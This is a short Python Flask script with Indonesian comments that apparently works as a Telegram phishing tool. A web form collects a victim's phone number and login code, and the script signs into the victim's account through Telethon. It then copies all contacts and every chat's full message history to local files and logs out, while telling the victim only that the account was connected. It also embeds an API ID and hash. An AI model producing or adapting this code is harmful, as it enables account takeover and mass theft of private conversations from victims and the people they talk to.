from telethon import TelegramClient
from flask import Flask, request, render_template
import os
import json

# Konfigurasi aplikasi Flask
app = Flask(__name__)

# Konfigurasi API Telegram
API_ID = '24835154'  # Ganti dengan API ID Anda
API_HASH = 'e7c35ab96f8d8f76513fd7a3ae242c3b'  # Ganti dengan API Hash Anda
PHONE_NUMBER = ''  # Nomor telepon pengguna yang akan dihubungkan
client = TelegramClient('session_name', API_ID, API_HASH)

@app.route('/')
def index():
    return render_template('index.html', message='')

@app.route('/send_otp', methods=['POST'])
def send_otp():
    global PHONE_NUMBER
    PHONE_NUMBER = request.form['phone']
    
    with client:
        client.send_code_request(PHONE_NUMBER)

    return render_template('index.html', message='OTP telah dikirim ke nomor Anda. Silakan periksa SMS.')

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    otp = request.form['otp']
    
    with client:
        try:
            client.sign_in(PHONE_NUMBER, otp)
            save_contacts_and_chats()
            logout_account()  # Menambahkan fungsi logout setelah penyimpanan
            message = 'Akun Anda telah berhasil terhubung! Kontak dan riwayat chat telah disimpan.'
        except Exception as e:
            message = f'Gagal verifikasi OTP: {str(e)}'

    return render_template('index.html', message=message)

def save_contacts_and_chats():
    # Mengambil kontak
    contacts = client.get_contacts()
    with open('/sdcard/contacts.txt', 'w') as f:
        for contact in contacts:
            f.write(f'{contact.first_name} {contact.last_name}: {contact.phone}\n')
    
    # Mengambil riwayat chat
    dialogs = client.get_dialogs()
    for dialog in dialogs:
        with open(f'/sdcard/chats/{dialog.name}.txt', 'w') as f:
            for message in client.iter_messages(dialog):
                f.write(f'[{message.date}] {message.sender_id}: {message.text}\n')

def logout_account():
    # Logout dari akun Telegram
    with client:
        client.log_out()

if __name__ == '__main__':
    app.run(debug=True)